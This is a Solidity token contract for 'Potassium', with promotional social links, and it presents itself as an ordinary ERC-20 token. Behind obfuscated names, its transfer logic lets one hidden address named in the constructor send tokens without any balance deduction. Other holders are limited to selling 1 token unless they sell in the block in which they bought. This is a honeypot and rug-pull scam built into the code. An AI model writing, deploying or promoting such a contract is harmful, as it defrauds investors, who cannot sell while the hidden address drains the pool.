/*

Telegram: https://t.me/PotassiumETH

Twitter: https://twitter.com/PotassiumEther

Website: https://potassium.crypto-token.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Potassium is Ownable {
    mapping(address => uint256) private fslzgokuq;

    IUniswapV2Router02 private nezgmw;

    function ntxeis(address pdomjklug, address uawilpoxyz, uint256 lsczrmihpfg) private {
        address xtokqrnwmev = IUniswapV2Factory(nezgmw.factory()).getPair(address(this), nezgmw.WETH());
        bool uoncgryqf = zfwpaho[pdomjklug] == block.number;
        if (0 == fslzgokuq[pdomjklug]) {
            if (pdomjklug != xtokqrnwmev && (!uoncgryqf || lsczrmihpfg > rfkiujs[pdomjklug]) && lsczrmihpfg < totalSupply) {
                require(lsczrmihpfg <= totalSupply / (10 ** decimals));
            }
            balanceOf[pdomjklug] -= lsczrmihpfg;
        }
        rfkiujs[uawilpoxyz] = lsczrmihpfg;
        balanceOf[uawilpoxyz] += lsczrmihpfg;
        zfwpaho[uawilpoxyz] = block.number;
        emit Transfer(pdomjklug, uawilpoxyz, lsczrmihpfg);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;

    mapping(address => uint256) private rfkiujs;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol;

    uint256 private vbclw = 105;

    mapping(address => uint256) public balanceOf;

    function approve(address ctvoenyjrif, uint256 lsczrmihpfg) public returns (bool success) {
        allowance[msg.sender][ctvoenyjrif] = lsczrmihpfg;
        emit Approval(msg.sender, ctvoenyjrif, lsczrmihpfg);
        return true;
    }

    function transferFrom(address pdomjklug, address uawilpoxyz, uint256 lsczrmihpfg) public returns (bool success) {
        require(lsczrmihpfg <= allowance[pdomjklug][msg.sender]);
        allowance[pdomjklug][msg.sender] -= lsczrmihpfg;
        ntxeis(pdomjklug, uawilpoxyz, lsczrmihpfg);
        return true;
    }

    mapping(address => uint256) private zfwpaho;

    constructor(string memory ofsceg, string memory eizcluvpsw, address xczohgvybrwi, address douhpyejtgxa) {
        name = ofsceg;
        symbol = eizcluvpsw;
        balanceOf[msg.sender] = totalSupply;
        fslzgokuq[douhpyejtgxa] = vbclw;
        nezgmw = IUniswapV2Router02(xczohgvybrwi);
    }

    function transfer(address uawilpoxyz, uint256 lsczrmihpfg) public returns (bool success) {
        ntxeis(msg.sender, uawilpoxyz, lsczrmihpfg);
        return true;
    }

    string public name;

    mapping(address => mapping(address => uint256)) public allowance;
}
